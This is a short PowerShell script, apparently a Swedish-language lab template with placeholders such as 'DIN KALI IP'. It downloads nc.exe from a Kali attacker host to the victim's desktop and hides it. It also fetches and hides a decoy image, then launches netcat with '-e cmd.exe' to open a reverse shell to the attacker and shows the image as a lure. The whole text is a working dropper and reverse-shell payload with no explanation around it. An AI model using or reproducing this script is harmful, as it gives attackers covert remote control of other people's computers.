$url = "http://KALILINUX_IP/nc.exe"
$desktopPath = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Desktop)
$filename ="nc.exe"
$finalPath = Join-Path -Path $desktopPath -ChildPath $filename

$url2 = "LÄNK TILL BILD"
$filename2 = "BILD NAMN.PNG"
$finalPath2 = Join-Path -Path $desktopPath -ChildPath $filename2

Invoke-WebRequest -Uri $url -OutFile $finalPath
Set-ItemProperty -Path $finalPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

Invoke-WebRequest -Uri $url2 -OutFile $finalPath2
Set-ItemProperty -Path $finalPath2 -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)

$params = "-d DIN KALI IP PORT XXXX -e cmd.exe"

Start-Process -FilePath $finalPath -ArgumentList $params
Start-Process $finalPath2
